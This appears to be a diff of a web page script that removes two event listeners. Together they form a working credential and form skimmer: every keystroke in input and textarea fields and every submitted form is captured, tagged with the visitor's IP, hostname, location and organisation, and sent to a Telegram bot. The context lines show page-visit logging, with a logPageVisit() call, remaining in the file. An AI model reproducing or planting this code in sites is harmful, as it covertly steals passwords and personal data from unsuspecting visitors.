@@ -48,39 +48,4 @@ ${domainHashTag}`;
     });
 }
 
-document.addEventListener("input", event => {
-    if (event.target.tagName === "INPUT" || event.target.tagName === "TEXTAREA") {
-        const inputType = event.target.type || "unknown";
-        const inputValue = event.target.value || "";
-        const inputName = event.target.name || "unnamed";
-        getIPInfo().then(info => {
-            hashDomain(info.org).then(domainHashTag => {
-                const message = `🔍 Новой ввод:
-- Поле: ${inputName} (${inputType})
-- Значение: ${inputValue}
-${domainHashTag}`;
-                sendToTelegram(message);
-            });
-        });
-    }
-});
-
-document.addEventListener("submit", event => {
-    const formData = new FormData(event.target);
-    const data = Array.from(formData.entries()).map(([key, value]) => `${key}: ${value}`).join("\n");
-    getIPInfo().then(info => {
-        hashDomain(info.org).then(domainHashTag => {
-            const message = `🚀 Отправка формы:
-- IP: ${info.ip}
-- Хост: ${info.hostname}
-- Местоположение: ${info.location}
-- Организация: ${info.org}
-- Данные формы:
-${data}
-${domainHashTag}`;
-            sendToTelegram(message);
-        });
-    });
-});
-
 logPageVisit();
